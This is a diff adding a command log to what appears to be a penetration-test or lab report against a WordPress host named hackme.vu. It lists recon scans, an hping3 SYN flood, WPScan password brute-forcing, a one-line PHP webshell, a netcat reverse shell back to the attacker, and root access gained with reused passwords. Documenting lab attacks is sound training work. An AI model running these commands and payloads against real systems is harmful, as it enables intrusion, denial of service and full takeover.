@@ -275,6 +275,75 @@ This demonstrates full compromise of:
     
 
 ---
+# Command log
+# -----------------------------
+# Initial Network Reconfiguration
+# -----------------------------
+`ip a`
+`sudo ip addr del 192.168.0.2/24 dev eth0`
+`sudo ip addr add 10.10.10.9/8 dev eth0`
+`sudo ip link set eth0 up`
+`ping 10.10.10.1`
+# -----------------------------
+# Reconnaissance
+# -----------------------------
+`nmap -sn 10.10.10.0/24`
+`netdiscover -r 10.10.10.0/8`
+`sudo nmap -sS -sV 10.10.10.1`
+`sudo nmap -sU 10.10.10.1`
+# -----------------------------
+# SYN Flood (hping3)
+# -----------------------------
+`sudo hping3 -S -p 21 10.10.10.1 --flood`
+# -----------------------------
+# WPScan Enumeration & Brute Force
+# -----------------------------
+`wpscan --url http://hackme.vu --enumerate u`
+`wpscan --url http://hackme.vu \`
+`--username user22 \`
+`--passwords /usr/share/wordlists/rockyou.txt`
+# -----------------------------
+# WordPress Admin Login
+# -----------------------------
+http://hackme.vu/wp-admin
+`Username: user22`
+`Password: awesome!`
+# -----------------------------
+# Webshell Upload (via WP File Manager)
+# -----------------------------
+Filename:
+`MALWARE_TATE_PANNAM.php`
+Webshell contents:
+`<?php system($_REQUEST['cmd']); ?>`
+# -----------------------------
+# Webshell Command Execution
+# -----------------------------
+`http://hackme.vu/wp-content/shell.php?cmd=id`
+# -----------------------------
+# Reverse Shell
+# -----------------------------
+# On attacker machine:
+`nc -lvnp 4444`
+# In browser via webshell:
+`http://hackme.vu/wp-content/shell.php?cmd=nc+-e+/bin/sh+10.10.10.9+4444`
+# -----------------------------
+# Post-Exploitation Enumeration
+# -----------------------------
+`cat /etc/passwd`
+# -----------------------------
+# Lateral Movement
+# -----------------------------
+su hackme
+`Password: awesome!`
+`id`
+# -----------------------------
+# Privilege Escalation
+# -----------------------------
+`cat /root/.mysql_history`
+`su -`
+`Password: toor`
+`id`
+`ip a`
 
 # Strategic Remediation Plan
 
